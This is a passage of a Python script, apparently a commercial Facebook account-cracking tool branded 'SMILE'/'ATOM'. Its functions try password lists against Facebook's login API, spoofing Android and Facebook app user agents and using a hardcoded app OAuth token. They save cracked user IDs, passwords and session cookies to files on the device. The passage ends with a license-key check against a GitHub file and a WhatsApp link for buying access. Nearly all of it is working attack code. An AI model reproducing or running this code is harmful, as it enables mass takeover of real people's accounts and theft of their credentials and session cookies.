'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H')
            uaD2 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460628;FBDM/{density=1.75,width=720,height=1423};FBLC/pt_BR;FBRV/0;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(sm_mdl))+";FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987658;FBDM/{density=3.0,width=1080,height=2020};FBLC/cs_CZ;FBRV/277454707;FBCR/O2.CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824636;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBRV/257684183;FB_FW/2;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G532M;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
            uaxx = f"Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm_mdl))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            logn_data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'email': ids,
'password': pww,
'generate_analytics_claims': '1',
'community_id': '',
'cpl': 'true',
'try_num': '1',
'family_device_id': str(uuid.uuid4()),
'credentials_type': 'password',
'source': 'login',
'error_detail_type': 'button_with_disabled',
'enroll_misauth': 'false',
'generate_session_cookies': '1',
'generate_machine_id': '1',
'currently_logged_in_userid': '0',
'locale': 'en_US',
'client_country_code': 'US',
'fb_api_req_friendly_name': 'authenticate'}
            user_info = {'User-Agent': ooo(),
'Accept-Encoding':  'gzip, deflate',
'Accept': '*/*',
'Connection': 'keep-alive',
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Friendly-Name': 'authenticate',
'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'unknown',
'Content-Type': 'application/x-www-form-urlencoded',
'X-FB-HTTP-Engine': 'Liger'}
            url = "https://graph.facebook.com/auth/login"
            sxr_respns = requests.post(url,data=logn_data,headers=user_info,allow_redirects=False).json()
            if "access_token" in sxr_respns:
                uid = str(sxr_respns['uid'])
                coki = ";".join(i["name"] + "=" + i["value"] for i in sxr_respns["session_cookies"])
                ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                respns=requests.get(ckk).text
                if 'Photoshop' in respns:
                    print(f"\r\r {b}[SUCCESS-💚] {uid} | {pww}")
                    if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIES : {coki}\n")
                    open('/sdcard/SMILE-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pww+'|'+coki+'\n')
                    open('/sdcard/SMILE-RNDM-OK.txt','a').write(uid+'|'+pww+'\n')
                    oks.append(uid)
                    Elite(uid,pww,coki)
                    break
                else:break
            elif 'www.facebook.com' in sxr_respns['error']['message']:
                uid = str(sxr_respns['error']['error_data']['uid'])
                #print(f"\r\r {c}[SMILE-CP] {uid} | {pww}")
                open('/sdcard/SMILE-RNDM-CP.txt','a').write(uid+'|'+pww+'\n')
                cps.append(uid)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass
#▬▭▬▭▬▭▬▭[ RANDOM MATHOD - 4 ]▬▭▬▭▬▭▬▭#
def rndm4(ids,passlist,mthd_svr,fb):
    global loop,oks,cps
    try:
        for pww in passlist:
            sys.stdout.write(f"\r\r {a}[{b}SMILE-M4{a}] {loop}{f}|{b}OK-{str(len(oks))}  {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()
            sm_mdl=("SM-G950U","SM-G970U","SM-G960U1","SM-G981U","SM-G965F","SM-G965U","SM-G973U","SM-G960U","SM-G960F","SM-G950F","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M")
            uaD2 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/321.0.0.37.119;FBBV/295907005;FBDM/{density=3.0,width=1080,height=2107};FBLC/cs_CZ;FBRV/297807842;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287518977;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBRV/289140577;FBCR/JIO 4G;FBMF/Micromax;FBBD/Micromax;FBPN/com.facebook.katana;FBDV/Micromax Q402+;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/319.0.0.39.120;FBBV/292233374;FBDM/{density=2.0,width=720,height=1280};FBLC/cs_CZ;FBRV/293535360;FBCR/Vodafone CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G398FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
            logn_data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'email': ids,
'password': pww,
'generate_analytics_claims': '1',
'community_id': '',
'cpl': 'true',
'try_num': '1',
'family_device_id': str(uuid.uuid4()),
'credentials_type': 'password',
'source': 'login',
'error_detail_type': 'button_with_disabled',
'enroll_misauth': 'false',
'generate_session_cookies': '1',
'generate_machine_id': '1',
'currently_logged_in_userid': '0',
'locale': 'en_US',
'client_country_code': 'US',
'fb_api_req_friendly_name': 'authenticate'}
            user_info = {'User-Agent': uaD2,
'Accept-Encoding':  'gzip, deflate',
'Accept': '*/*',
'Connection': 'keep-alive',
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Friendly-Name': 'authenticate',
'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'unknown',
'Content-Type': 'application/x-www-form-urlencoded',
'X-FB-HTTP-Engine': 'Liger'}
            url = "https://b-graph.facebook.com/auth/login"
            sxr_respns = requests.post(url,data=logn_data,headers=user_info,allow_redirects=False).json()
            if "access_token" in sxr_respns:
                uid = str(sxr_respns['uid'])
                coki = ";".join(i["name"] + "=" + i["value"] for i in sxr_respns["session_cookies"])
                ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                respns=requests.get(ckk).text
                if 'Photoshop' in respns:
                    print(f"\r\r {b}[SUCCESS-💚] {uid} | {pww}")
                    if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIES : {coki}\n")
                    open('/sdcard/SMILE-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pww+'|'+coki+'\n')
                    open('/sdcard/SMILE-RNDM-OK.txt','a').write(uid+'|'+pww+'\n')
                    oks.append(uid)
                    Elite(uid,pww,coki)
                    break
                else:break
            elif 'www.facebook.com' in sxr_respns['error']['message']:
                uid = str(sxr_respns['error']['error_data']['uid'])
                #print(f"\r\r {c}[SMILE-CP] {uid} | {pww}")
                open('/sdcard/SMILE-RNDM-CP.txt','a').write(uid+'|'+pww+'\n')
                cps.append(uid)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass
    
import os
K1=str(os.getuid())
K2=str(os.getgid())
num_key="xz$SMI-LE!5cs%s".join(K1+K2).upper()
from io import BytesIO
import pycurl,certifi
def Subscraption():
	UMO="BITHIKA"
	ML1="SBSBSBSB"
	sk = "K742J"
	lk = "7"
	uuid =str(os.geteuid()) + str(os.getlogin()) 
	id = "".join(uuid+sk+lk)
	key1 = UMO+id+ML1
	Key2 = ak+ATOM+key1
	r1=requests.get("https://github.com/DESTROYED-ATOM/approve/blob/main/approve.txt").text
	if Key2 in r1:
		os.system('clear')
		menu()
	else:
		os.system("clear")
		print("""\033[38;5;33m
 █████╗ ████████╗ ██████╗ ███╗   ███╗
██╔══██╗╚══██╔══╝██╔═══██╗████╗ ████║
███████║   ██║   ██║   ██║██╔████╔██║
██╔══██║   ██║   ██║   ██║██║╚██╔╝██║
██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║
╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
\033[38;5;196m────────────────────────────────────────────
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m CEO & OWNER    \033[38;5;196m : \x1b[38;5;196m SUMON X 𝗖𝗛𝗢𝗬𝗢𝗡
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m  ABOUTS  \033[38;5;196m  :\x1b[38;5;196m DESTROYED
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m VERSION \033[38;5;196m  :\x1b[38;1;97m no signal
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m STATUS \033[38;5;196m   :\x1b[38;5;196m PREMIUM 
\033[38;5;196m────────────────────────────────────────────""")
		print("\x1b[38;1;97m               NOTES   ")
		
		
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m HELLO.... DEAR USER THIS IS PREMIUM TOOLS ")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m ATOM TOOLS DAILY UPDATE ")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m PRICE LIST ADMIN INBOX ")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key:\033[0;93m " +ak+ATOM+key1)
		#name = input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m YOUR NAME : ")
		input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
		time.sleep(3.5)
		tks = 'JAY%20SHREE%20RAM,%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Sir%20%20My%20%20Key%20%20:%20'+ak+ATOM+key1
		os.system('am start https://wa.me/+918389066877?text=' + tks)
		Subscraption() 
Subscraption() 
menu()


